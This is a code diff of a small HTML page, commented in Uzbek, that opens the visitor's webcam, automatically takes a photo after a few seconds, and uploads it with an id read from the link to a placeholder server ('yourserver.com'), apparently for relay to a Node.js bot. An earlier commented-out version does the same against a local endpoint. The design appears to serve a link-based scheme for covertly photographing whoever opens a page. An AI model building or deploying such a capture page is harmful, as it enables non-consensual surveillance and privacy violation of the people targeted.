@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -43,7 +43,7 @@
         video.addEventListener('play', () => {
           setTimeout(() => {
             capturePhoto();
-          }, 1000); // 2 soniya kutib, rasmni oladi
+          }, 1000); // 1 soniya kutib, rasmni oladi
         });
       })
       .catch(err => {
@@ -63,7 +63,7 @@
         const formData = new FormData();
         formData.append('photo', blob, 'photo.jpg');
 
-        fetch('/upload', {
+        fetch('http://localhost:3000/upload', {
           method: 'POST',
           body: formData,
         })
@@ -78,5 +78,78 @@
       }, 'image/jpeg');
     }
   </script>
+</body>
+</html> -->
+
+
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rasmga Olish</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 20px;
+        }
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Rasmga tushirilmoqda...</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        // Kamera ruxsatini olish
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(captureImage, 5000); // 5 soniyada rasmga oladi
+            })
+            .catch(err => console.error("Kameraga ruxsat berilmadi!", err));
+
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Rasmni base64 formatda olish
+            const imageData = canvas.toDataURL("image/png");
+
+            // Rasmni Node.js botga yuborish
+            fetch("https://yourserver.com/upload", {
+                method: "POST",
+                body: JSON.stringify({ image: imageData, userId: getQueryParam("id") }),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.body.innerHTML = "<h1>Sizning rasmingiz botga yuborildi!</h1>";
+            })
+            .catch(err => console.error("Xatolik:", err));
+        }
+
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+    </script>
+
 </body>
 </html>
